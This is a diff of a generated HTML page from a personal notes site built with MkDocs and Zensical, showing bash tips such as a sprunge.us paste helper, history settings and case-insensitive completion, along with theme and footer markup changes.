+</span><span id="__span-44-12"><a id="__codelineno-44-12" name="__codelineno-44-12" href="#__codelineno-44-12"></a>sprunge<span class="o">()</span><span class="w"> </span><span class="o">{</span><span class="w"> </span>curl<span class="w"> </span>-F<span class="w"> </span><span class="s1">&#39;sprunge=&lt;-&#39;</span><span class="w"> </span>http://sprunge.us<span class="w"> </span>&lt;<span class="w"> </span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">1</span><span class="k">:-</span><span class="p">/dev/stdin</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">;</span><span class="w"> </span><span class="o">}</span><span class="w"> </span><span class="c1"># usage: sprunge FILE # or some_command | sprunge</span>
+</span><span id="__span-44-13"><a id="__codelineno-44-13" name="__codelineno-44-13" href="#__codelineno-44-13"></a>
+</span><span id="__span-44-14"><a id="__codelineno-44-14" name="__codelineno-44-14" href="#__codelineno-44-14"></a><span class="c1">## Don&#39;t record some commands</span>
+</span><span id="__span-44-15"><a id="__codelineno-44-15" name="__codelineno-44-15" href="#__codelineno-44-15"></a><span class="nb">export</span><span class="w"> </span><span class="nv">HISTIGNORE</span><span class="o">=</span><span class="s2">&quot;&amp;:[ ]*:exit:ls:bg:fg:history:clear&quot;</span>
+</span><span id="__span-44-16"><a id="__codelineno-44-16" name="__codelineno-44-16" href="#__codelineno-44-16"></a>
+</span><span id="__span-44-17"><a id="__codelineno-44-17" name="__codelineno-44-17" href="#__codelineno-44-17"></a><span class="c1">## Avoid duplicate entries</span>
+</span><span id="__span-44-18"><a id="__codelineno-44-18" name="__codelineno-44-18" href="#__codelineno-44-18"></a><span class="nv">HISTCONTROL</span><span class="o">=</span><span class="s2">&quot;erasedups:ignoreboth&quot;</span>
+</span><span id="__span-44-19"><a id="__codelineno-44-19" name="__codelineno-44-19" href="#__codelineno-44-19"></a>
+</span><span id="__span-44-20"><a id="__codelineno-44-20" name="__codelineno-44-20" href="#__codelineno-44-20"></a><span class="c1">## Perform file completion in a case insensitive fashion</span>
+</span><span id="__span-44-21"><a id="__codelineno-44-21" name="__codelineno-44-21" href="#__codelineno-44-21"></a><span class="nb">bind</span><span class="w"> </span><span class="s2">&quot;set completion-ignore-case on&quot;</span>
+</span></code></pre></div>
+<h3 id="bashrc">.bashrc<a class="headerlink" href="#bashrc" title="Permanent link">&para;</a></h3>
 <p><code>~/.bashrc</code> is executed every time you open a sub-shell. It <strong>should not</strong> output any text, otherwise certain things (eg: scp) will fail.</p>
-<h3 id="inputrc">~/.inputrc</h3>
+<h3 id="inputrc">~/.inputrc<a class="headerlink" href="#inputrc" title="Permanent link">&para;</a></h3>
 <p>This file defines some bash behaviors. It also affects some other tools.</p>
-<pre><code>## Ignore case while completing
-set completion-ignore-case on
-</code></pre>
-<h2 id="links">Links</h2>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-45-1"><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a>## Ignore case while completing
+</span><span id="__span-45-2"><a id="__codelineno-45-2" name="__codelineno-45-2" href="#__codelineno-45-2"></a>set completion-ignore-case on
+</span></code></pre></div>
+<h2 id="links">Links<a class="headerlink" href="#links" title="Permanent link">&para;</a></h2>
 <ul>
 <li>Command Line Quicksheet: <a href="http://www.pixelbeat.org/cmdline.html">http://www.pixelbeat.org/cmdline.html</a></li>
 <li>Tons of BASH examples: <a href="http://mywiki.wooledge.org/BashFAQ">http://mywiki.wooledge.org/BashFAQ</a></li>
@@ -11719,13 +11741,23 @@ set completion-ignore-case on
 
 
 
+
+
                 
               </article>
             </div>
           
           
+  <script>var tabs=__md_get("__tabs");if(Array.isArray(tabs))e:for(var set of document.querySelectorAll(".tabbed-set")){var labels=set.querySelector(".tabbed-labels");for(var tab of tabs)for(var label of labels.getElementsByTagName("label"))if(label.innerText.trim()===tab){var input=document.getElementById(label.htmlFor);input.checked=!0;continue e}}</script>
+
 <script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
         </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-circle-arrow-up" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><path d="m16 12-4-4-4 4M12 16V8"/></svg>
+  Back to top
+</button>
         
       </main>
       
@@ -11735,23 +11767,15 @@ set completion-ignore-case on
     <div class="md-footer-meta__inner md-grid">
       <div class="md-copyright">
   
+    <div class="md-copyright__highlight">
+      Copyright &copy; 2026 Daniel Hoherd
+
+    </div>
+  
   
     Made with
-    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
-      Material for MkDocs
-    </a>
-  
-</div>
-      
-        
-<div class="md-social">
-  
-    
-    
-    
-    
-    <a href="https://github.com/danielhoherd" target="_blank" rel="noopener" title="github.com/danielhoherd" class="md-social__link">
-      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+    <a href="https://zensical.org/" target="_blank" rel="noopener">
+      Zensical
     </a>
   
 </div>
@@ -11769,12 +11793,11 @@ set completion-ignore-case on
     
       
       
-      <script id="__config" type="application/json">{"annotate": null, "base": "..", "features": [], "search": "../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
-    
-    
-      <script src="../assets/javascripts/bundle.79ae519e.min.js"></script>
       
-        <script src="../static_assets/instant-page.js"></script>
+      <script id="__config" type="application/json">{"annotate":null,"base":"..","features":["announce.dismiss","content.code.annotate","content.code.copy","content.code.select","content.footnote.tooltips","content.tabs.link","content.tooltips","header.autohide","navigation.indexes","navigation.instant","navigation.instant.prefetch","navigation.path","navigation.sections","navigation.top","navigation.tracking","search.highlight"],"search":"../assets/javascripts/workers/search.e2d2d235.min.js","tags":null,"translations":{"clipboard.copied":"Copied to clipboard","clipboard.copy":"Copy to clipboard","search.result.more.one":"1 more on this page","search.result.more.other":"# more on this page","search.result.none":"No matching documents","search.result.one":"1 matching document","search.result.other":"# matching documents","search.result.placeholder":"Type to start searching","search.result.term.missing":"Missing","select.version":"Select version"},"version":null}</script>
+    
+    
+      <script src="../assets/javascripts/bundle.5fcf0de6.min.js"></script>
       
     
   </body>
